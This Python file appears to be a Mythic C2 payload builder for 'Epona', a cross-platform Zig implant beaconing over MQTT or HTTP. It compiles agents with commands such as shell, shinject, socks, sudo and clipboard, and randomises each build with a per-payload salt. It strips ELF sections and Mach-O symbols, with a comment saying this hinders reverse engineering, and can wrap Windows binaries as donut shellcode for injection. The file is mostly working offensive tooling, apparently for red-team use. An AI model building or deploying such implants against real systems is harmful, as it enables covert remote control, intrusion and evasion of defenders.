from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio, pathlib, os, tempfile, shutil, subprocess, json, datetime, hashlib, secrets
import donut


TARGET_MAP = {
    "Linux_x86_64":    "x86_64-linux-musl",
    "Linux_aarch64":   "aarch64-linux-musl",
    "Windows_x86_64":  "x86_64-windows-gnu",
    "Windows_aarch64": "aarch64-windows-gnu",
    "macOS_x86_64":    "x86_64-macos",
    "macOS_aarch64":   "aarch64-macos",
}


class Epona(PayloadType):
    name = "epona"
    file_extension = "bin"
    author = "@grampae"
    supported_os = [
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = False
    wrapped_payloads = []
    mythic_encrypts = True
    note = "Cross-platform Zig agent supporting MQTT and HTTP C2 profiles"
    supports_dynamic_loading = False
    build_parameters = [
        BuildParameter(
            name="target_os",
            parameter_type=BuildParameterType.ChooseOne,
            description="Target operating system and architecture",
            choices=list(TARGET_MAP.keys()),
            default_value="Linux_x86_64",
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.ChooseOne,
            description="Build with debug symbols (larger binary)",
            choices=["false", "true"],
            default_value="false",
        ),
        BuildParameter(
            name="skip_tls_verify",
            parameter_type=BuildParameterType.ChooseOne,
            description="Skip TLS certificate verification (required for self-signed certs)",
            choices=["true", "false"],
            default_value="true",
        ),
        BuildParameter(
            name="output_format",
            parameter_type=BuildParameterType.ChooseOne,
            description="Output format — shellcode wraps the PE via donut (Windows x86_64 only)",
            choices=["binary", "shellcode"],
            default_value="binary",
        ),
    ]
    c2_profiles = ["mqtt", "http"]

    agent_path = pathlib.Path(".") / "epona" / "mythic"
    agent_icon_path = agent_path / "epona.svg"
    agent_code_path = pathlib.Path(".") / "epona" / "agent_code"

    build_steps = [
        BuildStep(step_name="Compiling", step_description="Running zig build"),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        try:
            target_os  = self.get_parameter("target_os")
            debug      = self.get_parameter("debug") == "true"
            skip_tls   = self.get_parameter("skip_tls_verify") == "true"
            target     = TARGET_MAP[target_os]
            optimize   = "Debug" if debug else "ReleaseSmall"

            # Shared defaults
            interval    = "10"
            jitter      = "14"
            killdate    = "2099-01-01"
            enc_key     = ""
            dec_key     = ""
            crypto_type = "none"
            exch_chk    = "false"

            # MQTT defaults
            c2_profile  = "mqtt"
            mqtt_server   = "localhost"
            mqtt_server_1 = ""
            mqtt_server_2 = ""
            mqtt_server_3 = ""
            mqtt_port   = "8883"
            use_ssl     = "true"
            mqtt_client = "epona"
            mqtt_user   = ""
            mqtt_pass   = ""
            mqtt_topic  = ""
            mqtt_recv   = "1"
            mqtt_send   = "2"

            # HTTP defaults
            http_host     = "localhost"
            http_port     = "80"
            http_post_uri = "data"
            http_use_ssl  = "false"
            http_ua       = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"

            for c2 in self.c2info:
                p = c2.get_parameters_dict()

                if "callback_host" in p:
                    # HTTP C2 profile
                    c2_profile   = "http"
                    raw_host     = p.get("callback_host", "http://localhost")
                    if raw_host.startswith("https://"):
                        http_use_ssl = "true"
                        http_host    = raw_host[len("https://"):]
                    elif raw_host.startswith("http://"):
                        http_use_ssl = "false"
                        http_host    = raw_host[len("http://"):]
                    else:
                        http_host    = raw_host
                    http_port     = str(p.get("callback_port", http_port))
                    http_post_uri = p.get("post_uri", http_post_uri)
                    headers       = p.get("headers", {})
                    if isinstance(headers, dict):
                        http_ua = headers.get("User-Agent", http_ua)
                    interval  = str(p.get("callback_interval", interval))
                    jitter    = str(p.get("callback_jitter", jitter))
                    killdate  = p.get("killdate", killdate)
                    exch_chk_val = p.get("encrypted_exchange_check", exch_chk)
                    exch_chk  = "true" if str(exch_chk_val).lower() in ("true", "1", "yes") else "false"
                    aespsk    = p.get("AESPSK", {})
                    if isinstance(aespsk, dict):
                        crypto_type = aespsk.get("value", "none") or "none"
                        enc_key     = aespsk.get("enc_key", "") or ""
                        dec_key     = aespsk.get("dec_key", "") or ""

                elif "mqtt_server" in p:
                    # MQTT C2 profile
                    c2_profile    = "mqtt"
                    mqtt_server   = p.get("mqtt_server",   mqtt_server)
                    mqtt_server_1 = p.get("mqtt_server_1", mqtt_server_1) or ""
                    mqtt_server_2 = p.get("mqtt_server_2", mqtt_server_2) or ""
                    mqtt_server_3 = p.get("mqtt_server_3", mqtt_server_3) or ""
                    mqtt_port   = str(p.get("mqtt_port", mqtt_port))
                    use_ssl_val = p.get("use_ssl", use_ssl)
                    use_ssl     = "true" if str(use_ssl_val).lower() in ("true", "1", "yes") else "false"
                    mqtt_client = p.get("mqtt_client", mqtt_client)
                    mqtt_user   = p.get("mqtt_user", mqtt_user) or ""
                    mqtt_pass   = p.get("mqtt_pass", mqtt_pass) or ""
                    mqtt_topic  = p.get("mqtt_topic", mqtt_topic)
                    mqtt_recv   = str(p.get("mqtt_mythic", mqtt_recv))
                    mqtt_send   = str(p.get("mqtt_taskcheck", mqtt_send))
                    interval    = str(p.get("callback_interval", interval))
                    jitter      = str(p.get("callback_jitter", jitter))
                    killdate    = p.get("killdate", killdate)
                    exch_chk_val = p.get("encrypted_exchange_check", exch_chk)
                    exch_chk    = "true" if str(exch_chk_val).lower() in ("true", "1", "yes") else "false"
                    aespsk      = p.get("AESPSK", {})
                    if isinstance(aespsk, dict):
                        crypto_type = aespsk.get("value", "none") or "none"
                        enc_key     = aespsk.get("enc_key", "") or ""
                        dec_key     = aespsk.get("dec_key", "") or ""

            # Enforce AES encryption — plaintext comms are not allowed
            if crypto_type == "none":
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = (
                    "AES encryption is required. Enable 'Perform Key Exchange' "
                    "or set AESPSK in the C2 profile."
                )
                return resp

            # Randomize MQTT client ID per payload so each beacon is distinct
            if mqtt_client == "epona":
                mqtt_client = hashlib.sha256(self.uuid.encode()).hexdigest()[:16]

            # Per-build entropy seed — drives key derivation, junk blob, and
            # decode variant in obfuscate.zig so every payload is a unique binary.
            build_salt = secrets.randbits(64)

            # Convert killdate to unix timestamp
            try:
                kd = datetime.datetime.strptime(killdate, "%Y-%m-%d")
                kill_ts = int(kd.timestamp())
            except Exception:
                kill_ts = 9999999999

            with tempfile.TemporaryDirectory() as tmpdir:
                src = str(self.agent_code_path)
                dst = os.path.join(tmpdir, "agent")
                shutil.copytree(src, dst)

                out_dir = os.path.join(tmpdir, "out")
                os.makedirs(out_dir)

                selected_commands = set(self.commands.get_commands())

                cmd = [
                    "zig", "build",
                    f"-Dtarget={target}",
                    f"-Doptimize={optimize}",
                    f"-Dc2_profile={c2_profile}",
                    # MQTT params
                    f"-Dmqtt_server_0={mqtt_server}",
                    f"-Dmqtt_server_1={mqtt_server_1}",
                    f"-Dmqtt_server_2={mqtt_server_2}",
                    f"-Dmqtt_server_3={mqtt_server_3}",
                    f"-Dmqtt_port={mqtt_port}",
                    f"-Duse_ssl={use_ssl}",
                    f"-Dskip_tls_verify={'true' if skip_tls else 'false'}",
                    f"-Dmqtt_client_id={mqtt_client}",
                    f"-Dmqtt_user={mqtt_user}",
                    f"-Dmqtt_pass={mqtt_pass}",
                    f"-Dmqtt_topic={mqtt_topic}",
                    f"-Dmqtt_recv_topic={mqtt_recv}",
                    f"-Dmqtt_send_topic={mqtt_send}",
                    # HTTP params
                    f"-Dhttp_host={http_host}",
                    f"-Dhttp_port={http_port}",
                    f"-Dhttp_post_uri={http_post_uri}",
                    f"-Dhttp_use_ssl={http_use_ssl}",
                    f"-Dhttp_user_agent={http_ua}",
                    # Shared params
                    f"-Dcallback_interval={interval}",
                    f"-Dcallback_jitter={jitter}",
                    f"-Dkill_timestamp={kill_ts}",
                    f"-Dcrypto_type={crypto_type}",
                    f"-Denc_key={enc_key}",
                    f"-Ddec_key={dec_key}",
                    f"-Dpayload_uuid={self.uuid}",
                    f"-Dencrypted_exchange_check={exch_chk}",
                    f"-Dbuild_salt={build_salt}",
                    "--prefix", out_dir,
                ]
                _epona_cmds = [
                    "shell", "run", "cat", "ls", "cd", "pwd", "env", "ps",
                    "kill", "netstat", "cron", "shinject", "portscan",
                    "download", "upload", "socks", "mkdir", "cp", "mv", "rm",
                    "find", "sudo", "clipboard", "getprivs", "services",
                    "launchctl", "osascript", "jobs", "jobkill",
                ]
                for c in _epona_cmds:
                    cmd.append(f"-Dinclude_{c}=" + ("true" if c in selected_commands else "false"))

                result = subprocess.run(
                    cmd, cwd=dst,
                    capture_output=True, text=True, timeout=300,
                )

                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout=result.stdout[-2000:] if result.stdout else "",
                    StepStderr=result.stderr[-2000:] if result.stderr else "",
                    StepSuccess=(result.returncode == 0),
                ))

                if result.returncode != 0:
                    resp.set_status(BuildStatus.Error)
                    resp.build_stderr = result.stderr[-4000:]
                    return resp

                binary_name = "epona.exe" if "windows" in target else "epona"
                binary_path = os.path.join(out_dir, "bin", binary_name)

                # ELF post-processing: remove sections that aid reverse engineering.
                # objcopy is a GNU tool and silently does nothing on Mach-O/PE.
                subprocess.run(
                    ["objcopy",
                     "--remove-section=.eh_frame",
                     "--remove-section=.eh_frame_hdr",
                     "--remove-section=.comment",
                     binary_path],
                    capture_output=True,
                )

                # Mach-O post-processing: strip non-global (local) symbols.
                # Zig's -fstrip removes debug sections but leaves the local symbol
                # table, which contains every Enc("plaintext") type name verbatim.
                # llvm-strip -x removes those while preserving external symbols
                # that dyld requires. objcopy cannot handle Mach-O at all.
                if "macos" in target:
                    subprocess.run(
                        ["llvm-strip", "-x", binary_path],
                        capture_output=True,
                    )

                output_format = self.get_parameter("output_format")

                if output_format == "shellcode":
                    if target_os not in ("Windows_x86_64", "Windows_aarch64"):
                        resp.set_status(BuildStatus.Error)
                        resp.build_stderr = (
                            "Shellcode output requires a Windows target. "
                            "Select a Windows architecture or switch output format to 'binary'."
                        )
                        return resp
                    if target_os == "Windows_aarch64":
                        resp.set_status(BuildStatus.Error)
                        resp.build_stderr = (
                            "Shellcode output is only supported for Windows x86_64 — "
                            "donut does not support ARM64."
                        )
                        return resp

                    sc = donut.create(file=binary_path, arch=2)  # arch=2 → x64
                    resp.payload = sc
                    resp.build_message = (
                        f"Built {len(resp.payload):,} bytes shellcode (donut) for {target_os}"
                    )
                else:
                    with open(binary_path, "rb") as f:
                        resp.payload = f.read()
                    resp.build_message = f"Built {len(resp.payload):,} bytes for {target_os}"

        except Exception as e:
            import traceback
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = traceback.format_exc()

        return resp
